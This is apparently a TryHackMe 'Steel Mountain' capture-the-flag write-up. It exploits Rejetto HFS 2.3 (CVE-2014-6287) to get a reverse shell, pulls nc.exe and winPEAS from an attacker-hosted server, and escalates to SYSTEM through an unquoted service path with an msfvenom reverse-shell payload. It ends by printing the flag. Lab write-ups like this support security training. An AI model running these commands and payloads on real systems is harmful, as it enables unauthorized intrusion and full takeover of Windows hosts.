Room: https://tryhackme.com/room/steelmountain  

**sudo** nmap -sV -sS -T5 -vv xx.xx.xx.xx

```
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

On http://machineip:8080 we can find a file server running - Rejetto HTTP File Server2.3. 

**searchsploit** -w hfs 2.3
```
----------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                         |  URL
----------------------------------------------------------------------- --------------------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)            | https://www.exploit-db.com/exploits/49584
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)            | https://www.exploit-db.com/exploits/48569
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload         | https://www.exploit-db.com/exploits/30850
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)    | https://www.exploit-db.com/exploits/34668
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)    | https://www.exploit-db.com/exploits/39161
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Executi | https://www.exploit-db.com/exploits/34852
----------------------------------------------------------------------- --------------------------------------------

```

The CVE for this exploit is 2014-6287 and allows us RCE. We'll use the RCE(2) exploit.  

Download, edit the script and add: 
* Your attacking machine IP.
* A desired port.

Download ncat static binary for windows from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)
Create a HTTP server in the same folder as **nc.exe**.
> python -m SimpleHTTPServer 80

Then, start a netcat listener on the same port you set in the exploit.  
> nc -nvlp [port]  

We need to run the exploit twice.  
After the first run, it gets the netcat static binary via the HTTP server.  
```
Serving HTTP on 0.0.0.0 port 80 ...
xx.xx.xx.xx - - [09/Oct/2021 22:58:18] "GET /nc.exe HTTP/1.1" 200 -
xx.xx.xx.xx - - [09/Oct/2021 22:58:19] "GET /nc.exe HTTP/1.1" 200 -
xx.xx.xx.xx - - [09/Oct/2021 22:58:19] "GET /nc.exe HTTP/1.1" 200 -
xx.xx.xx.xx - - [09/Oct/2021 22:58:20] "GET /nc.exe HTTP/1.1" 200 -
```

After the second run, the binary gets called and we get a reverse shell on our netcat listener.   
```
connect to [xx.x.x.xxx] from (UNKNOWN) [xx.xx.xx.xx] 49177
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

```
After we get our reverse shell, we can get a script to check for windows vulnerabilities instead of looking for them manually.  
Download winPEAS and place it in the same folder with the HTTP server.  

From the reverse shell we got earlier, use ```powershell -c wget "http://attackingMachineIP/winPEASx86.exe" -outfile "winpeas.exe"```  

After we run it, we see something that can be easily abused.  
```
���������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
   =================================================================================================
```

**cd** C:\Program Files (x86)\IObit\Advanced SystemCare

We need to see if the process can be started/stopped and if we have permissions to do that.  

First, go back one one directory and run  

sc sq AdvancedSystemCareService9
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

icacls "Advanced SystemCare"
```
Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
                    NT SERVICE\TrustedInstaller:(I)(F)
                    ...................................
```
The (RX,W) is what matters -- It means we have acces to write, read and execute.  


Let's create a payload using **msfvenom** from the **attacking machine**.  
**msfvenom** -p windows/shell_reverse_tcp LHOST=attackingMachineIP LPORT=1111 -f exe -o Advanced.exe

Now, transfer the payload to C:\Program Files (x86)\IObit   
Start another listener on the attacking machine on the same port as the payload.  

On the target machine, run the following two commands:   
**sc** stop AdvancedSystemCareService9  
**sc** start AdvancedSystemCareService9   

We should get a remote shell on the second listener with administrator privileges.  
```
connect to [xx.x.x.xxx] from (UNKNOWN) [xx.xx.xx.xx] 49263
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

The flag is located on C:\Users\Administrator\Desktop.  
> 9af5f314f57607c00fd09803a587db80

## 

**Note**: There's another way in, using metasploit but that way is more guided & well explained in the room, so no point in covering that.  
